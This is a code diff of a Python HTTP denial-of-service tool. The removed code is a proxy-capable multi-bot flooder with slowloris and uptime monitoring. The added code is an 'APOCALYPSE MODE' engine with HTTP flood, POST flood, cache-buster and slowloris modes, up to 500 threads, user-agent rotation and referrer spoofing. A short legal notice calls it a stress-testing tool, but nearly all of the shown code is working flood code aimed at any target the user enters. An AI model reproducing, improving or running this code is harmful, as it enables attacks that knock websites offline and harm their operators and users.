+        with Live(layout, console=console, refresh_per_second=4) as live:
+            # Header
+            layout["header"].update(
+                Panel(
+                    Text.from_markup(
+                        "[bold red][ APOCALYPSE MODE ACTIVE - MAXIMUM POWER ][/bold red]\n"
+                        f"[cyan]Targets: {', '.join([urlparse(t).netloc for t in self.targets[:3]])}{'...' if len(self.targets) > 3 else ''}[/cyan]",
+                        justify="center"
+                    ),
+                    border_style="red"
+                )
+            )
+            
+            # Progress
+            task = progress.add_task("[cyan][+] Executing attack...", total=self.total_requests)
+            layout["progress"].update(Panel(progress, border_style="blue"))
             
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                
-                if not target.startswith("ip://") and tport == 443:
-                    context = ssl.create_default_context()
-                    s = context.wrap_socket(s, server_hostname=host)
-                
-                s.connect((host, tport))
-                stats_global["hits"] += 1
-                stats_bot["Spammer"]["hits"] += 1
-                stats_target[target]["hits"] += 1
-                
-                # Send simple GET request
-                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
-                request += generate_headers("Spammer", target)
-                request += "Connection: close\r\n\r\n"
-                
-                s.send(request.encode(errors="ignore"))
-                stats_global["sent"] += 1
-                stats_bot["Spammer"]["sent"] += 1
-                stats_target[target]["sent"] += 1
-                
-                # Try to receive response (to simulate real visit)
-                try:
-                    s.recv(1024)
-                except:
-                    pass
-                
-                s.close()
-                
-                # Progress indicator
-                progress = f"[{iteration+1}/{spammer_iterations}]"
-                print(f"{M}[SPAMMER]{R} {progress} → {target[:50]} | Loop: {loop_count+1} | Sent={stats_bot['Spammer']['sent']} | Hits={stats_bot['Spammer']['hits']}")
-                
-                time.sleep(random.uniform(0.01, 0.1))
-                
-            except Exception as e:
-                stats_global["error"] += 1
-                stats_bot["Spammer"]["error"] += 1
-                stats_target[target]["error"] += 1
-                stats_global["fail"] += 1
-                stats_bot["Spammer"]["fail"] += 1
-                stats_target[target]["fail"] += 1
-                try:
-                    s.close()
-                except:
-                    pass
+                with ThreadPoolExecutor(max_workers=self.current_threads) as executor:
+                    futures = [
+                        executor.submit(self.execute_request, i)
+                        for i in range(1, self.total_requests + 1)
+                    ]
+                    
+                    for future in as_completed(futures):
+                        if not self.running:
+                            executor.shutdown(wait=False, cancel_futures=True)
+                            break
+                        
+                        progress.update(task, advance=1)
+                        
+                        # Update dashboard
+                        stats_panel = self.create_live_dashboard()
+                        targets_panel = self.create_targets_panel()
+                        
+                        if targets_panel:
+                            layout["main"].split_row(
+                                Layout(stats_panel, ratio=2),
+                                Layout(targets_panel, ratio=1)
+                            )
+                        else:
+                            layout["main"].update(stats_panel)
+            
+            except KeyboardInterrupt:
+                console.log("[!] Attack interrupted by user")
+                self.running = False
         
-        loop_count += 1
-        print(f"{M}{B}[SPAMMER]{R} Completed loop #{loop_count} - Restarting...")
-        time.sleep(0.5)
-
-import requests  # pastikan sudah install requests[socks]
-
-# ===================== PROXY CONFIGURATION =====================
-use_proxy = str(input(f'{G}[?]{R} Aktifkan Proxy dari proxy.txt? (y/n): ')).lower()
-proxies = []
-proxy_index = 0
-
-if use_proxy == 'y':
-    try:
-        with open("proxy.txt","r") as pf:
-            proxies = [line.strip() for line in pf if line.strip()]
-        print(f"{G}[✓]{R} Loaded {len(proxies)} proxies from proxy.txt")
-        print(f"{C}Format supported:{R} http://ip:port | https://ip:port | socks4://ip:port | socks5://ip:port")
-    except Exception as e:
-        print(f"{M}[✗]{R} Error membaca proxy.txt: {e}")
-        proxies = []
-else:
-    print(f"{K}[!]{R} Proxy mode dinonaktifkan")
-
-# ===================== MAIN BOT ATTACK FUNCTION =====================
-# Tambahin dict global untuk nyimpen status code
-status_counts = {}
-
-def start(botname):
-    global stats_global, stats_bot, stats_target, proxy_index, status_counts
-    while True:
-        target = random.choice(targets)
-        if target.startswith("ip://"):
-            host = target.replace("ip://","")
-            path = "/"
-            tport = 80
-        else:
-            parsed = urllib.parse.urlparse(target)
-            host = parsed.netloc if parsed.netloc else "127.0.0.1"
-            path = parsed.path if parsed.path else "/"
-            tport = 443 if parsed.scheme=="https" else 80
-        try:
-            # === Proxy mode (HTTP/HTTPS/SOCKS) ===
-            if use_proxy == 'y' and proxies:
-                proxy = proxies[proxy_index % len(proxies)]
-                proxy_index += 1
-                try:
-                    resp = requests.get(
-                        target,
-                        headers={'User-Agent': random.choice(useragents)},
-                        proxies={'http': proxy, 'https': proxy},  # bisa http:// atau socks5://
-                        timeout=5
-                    )
-                    status_code = resp.status_code
-
-                    # catat status code ke dict global
-                    status_counts[status_code] = status_counts.get(status_code, 0) + 1
-
-                    stats_global["hits"]+=1; stats_bot[botname]["hits"]+=1; stats_target[target]["hits"]+=1
-                    stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1
-
-                    # tentukan warna status code
-                    if status_code == 200:
-                        status_color = f"{B}{G}"   # bold green
-                    elif 300 <= status_code < 400:
-                        status_color = C           # cyan
-                    elif 400 <= status_code < 500:
-                        status_color = K           # yellow
-                    elif 500 <= status_code < 600:
-                        status_color = M           # red
+        self.end_time = time.time()
+    
+    def generate_report(self):
+        """Generate comprehensive final report"""
+        console.print("\n")
+        console.rule("[bold cyan][*] FINAL ATTACK REPORT[/bold cyan]", style="cyan")
+        console.print()
+        
+        total_time = self.end_time - self.start_time
+        rps = self.total_completed / total_time if total_time > 0 else 0
+        success_rate = (self.total_success / self.total_completed * 100) if self.total_completed > 0 else 0
+        
+        # Summary
+        summary = Table(show_header=False, box=box.ROUNDED, border_style="green")
+        summary.add_column("Item", style="cyan bold", width=25)
+        summary.add_column("Value", style="white", width=50)
+        
+        summary.add_row("[+] Attack Mode", self.attack_mode.upper())
+        summary.add_row("[+] Targets", str(len(self.targets)))
+        summary.add_row("[+] Start Time", datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S'))
+        summary.add_row("[+] End Time", datetime.fromtimestamp(self.end_time).strftime('%Y-%m-%d %H:%M:%S'))
+        summary.add_row("[+] Duration", f"{total_time:.2f} seconds")
+        summary.add_row("[+] Peak Threads", str(self.current_threads))
+        
+        console.print(Panel(summary, title="[bold green][*] Summary[/bold green]", border_style="green"))
+        console.print()
+        
+        # Performance
+        perf_table = Table(show_header=True, box=box.ROUNDED, border_style="magenta")
+        perf_table.add_column("Metric", style="yellow bold", width=30)
+        perf_table.add_column("Value", style="white", width=20)
+        perf_table.add_column("Assessment", style="cyan", width=20)
+        
+        perf_table.add_row(
+            "[+] Total Requests",
+            f"{self.total_completed:,} / {self.total_requests:,}",
+            "COMPLETE" if self.total_completed == self.total_requests else "INTERRUPTED"
+        )
+        
+        success_color = "green" if success_rate > 95 else "yellow" if success_rate > 80 else "red"
+        perf_table.add_row(
+            "[+] Success Rate",
+            f"[{success_color}]{success_rate:.2f}%[/{success_color}]",
+            f"{self.total_success:,} succeeded"
+        )
+        
+        perf_table.add_row(
+            "[+] Failed Requests",
+            f"{self.total_failed:,}",
+            f"{(self.total_failed/self.total_completed*100) if self.total_completed > 0 else 0:.2f}%"
+        )
+        
+        rps_color = "green" if rps > 100 else "yellow" if rps > 50 else "white"
+        rps_assess = "EXTREME" if rps > 200 else "HIGH" if rps > 100 else "MEDIUM" if rps > 50 else "LOW"
+        perf_table.add_row(
+            "[+] Requests/Second",
+            f"[{rps_color}]{rps:.2f} req/s[/{rps_color}]",
+            rps_assess
+        )
+        
+        bandwidth = (self.total_bytes / total_time / 1024 / 1024) if total_time > 0 else 0
+        perf_table.add_row(
+            "[+] Total Bandwidth",
+            f"{self.total_bytes/1024/1024:.2f} MB",
+            f"{bandwidth:.2f} MB/s"
+        )
+        
+        console.print(Panel(perf_table, title="[bold magenta][*] Performance Metrics[/bold magenta]", border_style="magenta"))
+        console.print()
+        
+        # Per-target breakdown (if multiple targets)
+        if len(self.targets) > 1:
+            target_table = Table(show_header=True, box=box.ROUNDED, border_style="yellow")
+            target_table.add_column("Target", style="cyan", width=40)
+            target_table.add_column("Requests", style="white", width=12, justify="right")
+            target_table.add_column("Success", style="green", width=12, justify="right")
+            target_table.add_column("Failed", style="red", width=12, justify="right")
+            target_table.add_column("Rate", style="yellow", width=10, justify="right")
+            
+            for target, stats in self.stats.items():
+                display_target = target if len(target) <= 40 else target[:37] + "..."
+                completed = stats['completed']
+                success = stats['success']
+                failed = stats['failed']
+                rate = (success / completed * 100) if completed > 0 else 0
+                
+                target_table.add_row(
+                    display_target,
+                    f"{completed:,}",
+                    f"{success:,}",
+                    f"{failed:,}",
+                    f"{rate:.1f}%"
+                )
+            
+            console.print(Panel(target_table, title="[bold yellow][*] Per-Target Results[/bold yellow]", border_style="yellow"))
+            console.print()
+        
+        # Status codes (aggregate)
+        all_status_codes = {}
+        for target_stats in self.stats.values():
+            for code, count in target_stats['status_codes'].items():
+                if code not in all_status_codes:
+                    all_status_codes[code] = 0
+                all_status_codes[code] += count
+        
+        if all_status_codes:
+            codes_table = Table(show_header=True, box=box.ROUNDED, border_style="blue")
+            codes_table.add_column("Status Code", style="white bold", width=30)
+            codes_table.add_column("Count", style="cyan", width=15, justify="right")
+            codes_table.add_column("Percentage", style="yellow", width=15, justify="right")
+            
+            sorted_codes = sorted(all_status_codes.items(), key=lambda x: x[1], reverse=True)
+            
+            for code, count in sorted_codes:
+                percentage = (count / self.total_completed * 100) if self.total_completed > 0 else 0
+                
+                if isinstance(code, int):
+                    if code == 200:
+                        display = f"[green][+] {code} OK[/green]"
+                    elif 200 <= code < 300:
+                        display = f"[green][+] {code}[/green]"
+                    elif 300 <= code < 400:
+                        display = f"[blue][+] {code}[/blue]"
+                    elif 400 <= code < 500:
+                        display = f"[yellow][!] {code}[/yellow]"
                     else:
-                        status_color = A           # gray
-
-                    print(f"{C}[{botname} PROXY]{R} via {proxy} → {target[:40]} | Status={status_color}{status_code}{R} | Sent={stats_bot[botname]['sent']} | Hits={stats_bot[botname]['hits']}")
-                except Exception as e:
-                    stats_global["fail"]+=1; stats_bot[botname]["fail"]+=1; stats_target[target]["fail"]+=1
-                    print(f"{M}[FAIL PROXY]{R} {proxy} → {e}")
-
-            # === Direct mode (kode asli) ===
-            else:
-                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.settimeout(3)
-                if not target.startswith("ip://") and tport==443:
-                    context=ssl.create_default_context()
-                    s=context.wrap_socket(s,server_hostname=host)
-                s.connect((host,tport))
-                stats_global["hits"]+=1; stats_bot[botname]["hits"]+=1; stats_target[target]["hits"]+=1
-
-                if botname=="Alpha": method="GET"
-                elif botname=="Bravo": method="POST"
-                elif botname=="Charlie": method=random.choice(["HEAD","OPTIONS"])
-                elif botname=="Delta": method="GET"
-                elif botname=="Echo": method="CHUNKED"
-                elif botname=="Foxtrot": method="COMPRESS"
-                elif botname=="Gamma": method=random.choice(["TRACE","PUT"])
-                else: method="GET"
-
-                main_req=build_request(method,botname,host,path,target)
-                s.send(main_req.encode(errors="ignore"))
-                stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1
-
-                for _ in range(pack):
-                    s.send(main_req.encode(errors="ignore"))
-                    stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1
-                    time.sleep(random.choice([0.01,0.05,0.1,0.5,1.0]))
-
-                if botname=="Delta": slowloris_attack(s,botname)
-                s.close()
-
-                # Print progress dengan warna per bot
-                bot_color = G if botname in ["Alpha","Bravo","Charlie"] else C if botname in ["Delta","Echo"] else O
-                print(f"{bot_color}[{botname.ljust(8)}]{R} → {target[:40].ljust(40)} | Sent={str(stats_bot[botname]['sent']).ljust(6)} | Hits={str(stats_bot[botname]['hits']).ljust(6)} | Monitor={stats_target[target]['monitor']}")
-
-        except Exception:
-            stats_global["error"]+=1; stats_bot[botname]["error"]+=1; stats_target[target]["error"]+=1
-            try: s.close()
-            except: pass
-            stats_global["fail"]+=1; stats_bot[botname]["fail"]+=1; stats_target[target]["fail"]+=1
-            time.sleep(1)
-
-def slowloris_attack(sock,botname):
-    for _ in range(5):
-        try:
-            sock.send(f"X-KeepAlive-{rand_string(4)}: {rand_string(10)}\r\n".encode())
-            time.sleep(random.uniform(1,3))
-        except: break
-
-# ===================== TARGET MONITOR =====================
-def monitor_target(target,interval=5):
-    if target.startswith("ip://"):
-        host = target.replace("ip://","")
-        tport = 80
-    else:
-        parsed = urllib.parse.urlparse(target)
-        host = parsed.netloc if parsed.netloc else "127.0.0.1"
-        tport = 443 if parsed.scheme=="https" else 80
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            start_t = time.time()
-            s.connect((host, tport))
-            latency = (time.time() - start_t) * 1000
-            stats_target[target]["monitor"] = f"{G}UP ({latency:.2f}ms){R}"
-            s.close()
-        except:
-            stats_target[target]["monitor"] = f"{M}DOWN{R}"
-        time.sleep(interval)
-
-# ===================== START SYSTEM =====================
-print()
-print_border("═", 80, G)
-print(f"{B}{G}[SYSTEM STARTING]{R}")
-print_border("═", 80, G)
-print(f"{C}[⚡]{R} Initializing monitors...")
-
-# Jalankan monitor untuk semua target
-for t in targets:
-    th = threading.Thread(target=monitor_target, args=(t,))
-    th.daemon = True
-    th.start()
-    time.sleep(0.1)
-
-print(f"{G}[✓]{R} All monitors active")
-print(f"{C}[⚡]{R} Deploying bot swarm...")
-
-# Jalankan bot swarm (7 bot pertama)
-botnames = ["Alpha", "Bravo", "Charlie", "Delta", "Echo", "Foxtrot", "Gamma"]
-for x in range(thread_count):
-    botname = botnames[x % len(botnames)]
-    thred = threading.Thread(target=start, args=(botname,))
-    thred.daemon = True
-    thred.start()
-    time.sleep(0.05)
-
-print(f"{G}[✓]{R} {thread_count} bot threads deployed")
-
-# Jalankan Spammer Bot jika diaktifkan
-if enable_spammer == 'y' and spammer_iterations > 0:
-    print(f"{M}[⚡]{R} Launching SPAMMER BOT...")
-    spam_thread = threading.Thread(target=spammer_bot)
-    spam_thread.daemon = True
-    spam_thread.start()
-    time.sleep(0.1)
-    print(f"{M}{B}[✓] SPAMMER BOT ACTIVE - Loop mode with {spammer_iterations} iterations{R}")
-
-print_border("═", 80, G)
-print(f"{B}{C}[ATTACK INITIATED - Press Ctrl+C to stop]{R}")
-print_border("═", 80, C)
-print()
-
-start_time = datetime.now()
-
-# Deteksi IP public di awal
-print(f"{C}[⚡]{R} Detecting your public IP...")
-my_public_ip = get_public_ip()
-if "Unable" not in my_public_ip:
-    print(f"{G}[✓]{R} Your IP: {P}{my_public_ip}{R}")
-else:
-    print(f"{K}[!]{R} IP detection failed (offline mode?)")
-print()
-
-# ===================== MAIN LOOP + SUMMARY =====================
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    end_time = datetime.now()
-    duration = (end_time - start_time).total_seconds()
-    
-    clear_screen()
-    print()
-    print_border("═", 80, M)
-    print(f"{B}{M}[⛔ ATTACK STOPPED - GENERATING REPORT]{R}")
-    print_border("═", 80, M)
-    print()
-    
-    # ===================== GLOBAL SUMMARY =====================
-    print(f"{B}📊 GLOBAL SUMMARY{R}")
-    print_border("─", 80, W)
-    print(f"{G}⏱️  Duration:{R} {duration:.2f} seconds")
-    print(f"{C}📤 Total Sent:{R} {stats_global['sent']:,}")
-    print(f"{G}🎯 Total Hits:{R} {stats_global['hits']:,}")
-    print(f"{K}❌ Total Fail:{R} {stats_global['fail']:,}")
-    print(f"{M}⚠️  Total Error:{R} {stats_global['error']:,}")
-    
-    if duration > 0:
-        rps = stats_global['sent'] / duration
-        print(f"{P}⚡ Requests/sec:{R} {rps:.2f}")
-    
-    # Tampilkan IP yang digunakan
-    ip_color = P if my_public_ip != "Unable to detect" else K
-    tor_indicator = ""
-    if my_public_ip != "Unable to detect":
-        if not my_public_ip.startswith(("192.", "10.", "172.")):
-            tor_indicator = f" {A}(via Proxy/Tor?){R}"
-    print(f"{C}🌐 My IP:{R} {ip_color}{my_public_ip}{R}{tor_indicator}")
-    
-    print()
-    
-    # ===================== STATUS CODE BREAKDOWN =====================
-    if use_proxy == 'y' and proxies:
-        print(f"{B}📊 STATUS CODE BREAKDOWN{R}")
-        print_border("─", 80, C)
-        header_status = f"{B}{'Status Code'.ljust(15)} {'Count'.ljust(10)}{R}"
-        print(header_status)
-        print_border("─", 80, A)
-        if 'status_counts' in globals():
-            for code, count in status_counts.items():
-                row_status = f"{G}{str(code).ljust(15)}{R} {str(count).ljust(10)}"
-                print(row_status)
+                        display = f"[red][!] {code}[/red]"
+                else:
+                    display = f"[red][!] {str(code)[:28]}[/red]"
+                
+                codes_table.add_row(display, f"{count:,}", f"{percentage:.2f}%")
+            
+            console.print(Panel(codes_table, title="[bold blue][*] Status Code Distribution[/bold blue]", border_style="blue"))
+            console.print()
+        
+        # Final verdict
+        if self.total_completed < self.total_requests:
+            console.print(Panel(
+                f"[yellow][!] Attack interrupted before completion[/yellow]\n"
+                f"Completed: [cyan]{self.total_completed:,}[/cyan] / [dim]{self.total_requests:,}[/dim] "
+                f"([yellow]{self.total_completed/self.total_requests*100:.1f}%[/yellow])",
+                border_style="yellow"
+            ))
         else:
-            print(f"{K}[!]{R} Tidak ada data status code")
-        print()
+            console.print(Panel(
+                f"[bold green][+] Attack completed successfully[/bold green]\n"
+                f"All [cyan]{self.total_requests:,}[/cyan] requests executed",
+                border_style="green"
+            ))
+        
+        console.print()
+        console.rule("[bold cyan][*] End of Report[/bold cyan]", style="cyan")
+        console.print()
+
+
+def main():
+    """Main entry point"""
+    console.clear()
+    console.print(BANNER, style="bold cyan")
     
-    # ===================== BOT BREAKDOWN =====================
-    print_border("─", 80, C)
-    print(f"{B}📊 BOT BREAKDOWN{R}")
-    print_border("─", 80, C)
+    # Warning
+    warning = Panel(
+        "[bold red][!] APOCALYPSE MODE WARNING[/bold red]\n\n"
+        "This is an extremely powerful stress testing tool with maximum capabilities.\n"
+        "[yellow]Features enabled:[/yellow]\n"
+        "  [+] Multi-target attack\n"
+        "  [+] User-Agent rotation (1000+ agents)\n"
+        "  [+] Referrer spoofing\n"
+        "  [+] Cache buster\n"
+        "  [+] Auto-scaling threads\n"
+        "  [+] AI crash prediction\n"
+        "  [+] Multiple attack modes\n\n"
+        "[red]Legal Notice:[/red]\n"
+        "  [+] Only test servers you own or have explicit permission\n"
+        "  [+] Unauthorized testing is illegal in most jurisdictions\n"
+        "  [+] You accept full responsibility for your actions\n\n"
+        "[dim]By proceeding, you confirm you have authorization to test the target(s).[/dim]",
+        title="[bold yellow][!] Legal Warning[/bold yellow]",
+        border_style="yellow",
+        box=box.DOUBLE
+    )
+    console.print(warning)
+    console.print()
     
-    header_bot = f"{B}{'Bot'.ljust(12)} {'Sent'.ljust(10)} {'Hits'.ljust(10)} {'Fail'.ljust(10)} {'Error'.ljust(10)}{R}"
-    print(header_bot)
-    print_border("─", 80, A)
+    # Configuration
+    console.print("[bold cyan][*] Configuration[/bold cyan]\n")
     
-    for bot, stat in sorted(stats_bot.items()):
-        bot_color = M if bot == "Spammer" else G if stat['sent'] > 0 else A
-        row_bot = f"{bot_color}{bot.ljust(12)}{R} {str(stat['sent']).ljust(10)} {str(stat['hits']).ljust(10)} {str(stat['fail']).ljust(10)} {str(stat['error']).ljust(10)}"
-        print(row_bot)
+    # Targets
+    console.print("[+] Enter target URL(s) (comma-separated for multi-target):")
+    targets_input = console.input("[cyan]   >> [/cyan]").strip()
     
-    print()
+    if ',' in targets_input:
+        targets = [t.strip() for t in targets_input.split(',')]
+    else:
+        targets = [targets_input]
     
-    # ===================== TARGET BREAKDOWN =====================
-    print_border("─", 80, C)
-    print(f"{B}📊 TARGET BREAKDOWN{R}")
-    print_border("─", 80, C)
+    # Auto-add https if needed
+    for i, target in enumerate(targets):
+        if not target.startswith(('http://', 'https://')):
+            targets[i] = 'https://' + target
+            console.print(f"[yellow][+] Auto-added https:// to target {i+1}[/yellow]")
     
-    header_target = f"{B}{'Target'.ljust(45)} {'Sent'.ljust(8)} {'Hits'.ljust(8)} {'Fail'.ljust(8)} {'Monitor'.ljust(15)}{R}"
-    print(header_target)
-    print_border("─", 80, A)
+    # Attack mode
+    console.print("\n[+] Select attack mode:")
+    console.print("   [1] Normal (Standard HTTP requests)")
+    console.print("   [2] HTTP Flood (Rapid fire with random headers)")
+    console.print("   [3] POST Flood (POST spam with random payload)")
+    console.print("   [4] Cache Buster (Bypass caching)")
+    console.print("   [5] Slowloris (Keep-alive exhaustion)")
     
-    for target, stat in stats_target.items():
-        target_short = target[:45].ljust(45)
-        row_target = f"{target_short} {str(stat['sent']).ljust(8)} {str(stat['hits']).ljust(8)} {str(stat['fail']).ljust(8)} {stat['monitor']}"
-        print(row_target)
+    mode_input = console.input("[cyan]   >> [/cyan]").strip() or "1"
+    mode_map = {
+        "1": AttackMode.NORMAL,
+        "2": AttackMode.HTTP_FLOOD,
+        "3": AttackMode.POST_FLOOD,
+        "4": AttackMode.CACHE_BUSTER,
+        "5": AttackMode.SLOWLORIS
+    }
+    attack_mode = mode_map.get(mode_input, AttackMode.NORMAL)
     
-    print()
-    print_border("═", 80, G)
-    print(f"{B}{G}[✓] Report generated successfully{R}")
-    print(f"{DIM}Session ended at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}{R}")
-    print_border("═", 80, G)
-    print()
+    # Requests
+    requests_input = console.input("\n[+] Total requests [1000]: ").strip()
+    total_requests = int(requests_input) if requests_input else 1000
     
-    sys.exit(0)
+    # Threads
+    threads_input = console.input("[+] Initial threads (max: 500) [50]: ").strip()
+    threads = int(threads_input) if threads_input else 50
+    threads = min(threads, 500)
+    
+    # Delay
+    delay_input = console.input("[+] Delay per request in seconds [0]: ").strip()
+    delay = float(delay_input) if delay_input else 0
+    
+    # Auto-scale
+    auto_scale_input = console.input("[+] Enable auto-scaling? (y/n) [y]: ").strip().lower()
+    auto_scale = auto_scale_input != 'n'
+    
+    # Cache buster
+    cache_buster_input = console.input("[+] Enable cache buster? (y/n) [y]: ").strip().lower()
+    use_cache_buster = cache_buster_input != 'n'
+    
+    console.print()
+    
+    # Create engine
+    engine = ApocalypseEngine(
+        targets=targets,
+        total_requests=total_requests,
+        threads=threads,
+        delay=delay,
+        attack_mode=attack_mode
+    )
+    
+    engine.auto_scale = auto_scale
+    engine.use_cache_buster = use_cache_buster
+    
+    # Show config summary
+    config_table = Table(show_header=False, box=box.ROUNDED, border_style="cyan")
+    config_table.add_column("Setting", style="yellow bold", width=25)
+    config_table.add_column("Value", style="white", width=50)
+    
+    config_table.add_row("[+] Target(s)", f"{len(targets)} target(s)")
+    for i, target in enumerate(targets[:3], 1):
+        config_table.add_row(f"    Target {i}", target)
+    if len(targets) > 3:
+        config_table.add_row("    ...", f"and {len(targets)-3} more")
+    
+    config_table.add_row("[+] Attack Mode", attack_mode.upper())
+    config_table.add_row("[+] Total Requests", f"{total_requests:,}")
+    config_table.add_row("[+] Initial Threads", str(threads))
+    config_table.add_row("[+] Delay", f"{delay}s")
+    config_table.add_row("[+] Auto-Scaling", "ENABLED" if auto_scale else "DISABLED")
+    config_table.add_row("[+] Cache Buster", "ENABLED" if use_cache_buster else "DISABLED")
+    config_table.add_row("[+] User-Agent Rotation", "ENABLED")
+    config_table.add_row("[+] Referrer Spoofing", "ENABLED")
+    
+    console.print(Panel(config_table, title="[bold green][*] Final Configuration[/bold green]", border_style="green"))
+    console.print()
+    
+    # Confirmation
+    confirm = console.input("[bold red][!] Launch APOCALYPSE MODE attack? (yes/no): [/bold red]").strip().lower()
+    
+    if confirm != 'yes':
+        console.print("[red][!] Attack cancelled[/red]")
+        return
+    
+    console.clear()
+    console.print(BANNER, style="bold cyan")
+    
+    with console.status("[bold green][+] Initializing attack engine...", spinner="dots"):
+        time.sleep(2)
+    
+    console.print("[bold green][+] Engine ready - APOCALYPSE MODE ACTIVE[/bold green]\n")
+    time.sleep(1)
+    
+    try:
+        engine.run_attack()
+        engine.generate_report()
+    except KeyboardInterrupt:
+        console.print("\n[yellow][!] Attack interrupted by user[/yellow]")
+        engine.running = False
+        engine.end_time = time.time()
+        time.sleep(0.5)
+        engine.generate_report()
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        console.print("\n[red][!] Process terminated[/red]")
+    except Exception as e:
+        console.print(f"\n[red][!] Fatal error: {e}[/red]")
 
